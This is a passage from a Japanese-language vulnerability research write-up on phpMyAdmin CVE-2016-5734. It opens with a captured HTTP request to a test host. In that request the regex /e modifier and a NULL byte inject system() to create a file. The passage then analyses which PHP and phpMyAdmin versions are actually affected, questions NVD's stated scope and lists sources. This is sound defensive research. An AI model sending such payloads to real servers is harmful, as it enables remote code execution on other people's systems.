Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://vlun.test/phpmyadmin4.4/db_central_columns.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Cookie: pma_lang=ja; pma_collation_connection=utf8_unicode_ci; phpMyAdmin=h570mmbre13ohk3op3l5eoqkpi5r8c96; pma_iv-1=qfC3X1Rxqy%2BHM111U45i8A%3D%3D; pmaUser-1=Dpkv889nDY4H%2FGEo9zXw3w%3D%3D; pmaPass-1=EavpW0IpaWRAgGMgCEpTVg%3D%3D; pma_console_height=92; auto_saved_sql=SELECT%20*%20from%20test%20where%20NOT%20%3D%20'hoge'%3B; pma_console_config=%7B%22alwaysExpand%22%3Afalse%2C%22startHistory%22%3Afalse%2C%22currentQuery%22%3Atrue%7D; pma_console_mode=collapse
Connection: close

db=CVE-2016-5734&table=CVE-2016-5734&token=cc00761075dea256255cabd2b9e6a0b6&goto=&back=tbl_find_replace.php&find=.*%2Fe%00&replaceWith=system%28%27%2Fusr%2Fbin%2Ftouch+%2Ftmp%2FCVE-2016-5734%27%29%3B&columnIndex=0&useRegex=on&submit=%E5%AE%9F%E8%A1%8C&ajax_request=true&_nocache=1468572249141822862
```

 * /tmp/CVE-2016-5734というファイルが作成されることを確認する

### phpMyAdmin4.6.2に関わる技術的な調査

phpMyAdmin4.6.2に関してはphp5.5上での動作しかできないため、NULL終端攻撃ができない。よって、CVE-2016-5734は発現しないと考える。

## まとめ

CVE-2016-5734はPHP5.4.6以下の利用していた場合に、phpMyAdmin4.4系のみで発現する脆弱性だと思われる。

## 得られた知見

 * PHPのPCRE関数は英数字、バックスラッシュ、空白文字以外の任意の文字を[デリミタ](http://php.net/manual/ja/regexp.reference.delimiters.php)として使うことができる
 * PHP5.4.6以下ではNULL終端攻撃を使用することができる。

## 得られた疑問

調査の結果、NVDとかなり異なる影響範囲になった。確かにNVDが対象とするソースには問題があるが、実際に攻撃可能かというと疑問がある。私の調査に不備があるのか、NVDの影響範囲の出し方の考え方が異なるのかが知りたい。

## 情報源

 * [CERT](https://www.kb.cert.org/vuls/byid?query=CVE-2016-5734&searchview=)
 * [Debian](https://security-tracker.debian.org/tracker/CVE-2016-5734)
 * [Github](https://github.com/search?q="CVE-2016-5734")
 * [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-5734)
 * [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5734)
 * [PacketStorm](https://packetstormsecurity.com/search/?q=CVE-2016-5734)
 * [Redhat](https://access.redhat.com/security/cve/CVE-2016-5734)
 * [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5734.html)
 * [bugtraq](https://marc.info/?s=CVE-2016-5734&l=bugtraq)
 * [exploitdb](https://www.exploit-db.com/search/?action=search&cve=2016-5734)
 * [fulldisc](https://marc.info/?s=CVE-2016-5734&l=full-disclosure)
 * [metasploit](https://www.rapid7.com/db/search?q=CVE-2016-5734)
 * [oss-sec](https://marc.info/?s=CVE-2016-5734&l=oss-security)


